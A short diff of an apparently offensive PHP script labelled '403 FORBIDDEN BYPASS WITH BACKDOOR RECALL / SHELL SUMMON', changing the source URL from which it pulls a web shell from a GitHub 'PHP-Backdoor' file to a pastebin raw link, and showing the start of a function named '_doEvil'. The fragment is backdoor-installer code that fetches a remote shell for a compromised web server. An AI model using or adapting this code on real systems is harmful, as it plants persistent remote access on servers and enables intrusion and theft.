@@ -3,7 +3,7 @@
 	403 FORBIDDEN BYPASS
 	WITH BACKDOOR RECALL / SHELL SUMMON
 */
-$source = "https://raw.githubusercontent.com/zerobyte-id/PHP-Backdoor/master/0byt3m1n1/0byt3m1n1.php";
+$source = "https://pastebin.com/raw/m94Gt7xY";
 $name = "0byte.php";
 
 function _doEvil($name, $file) {
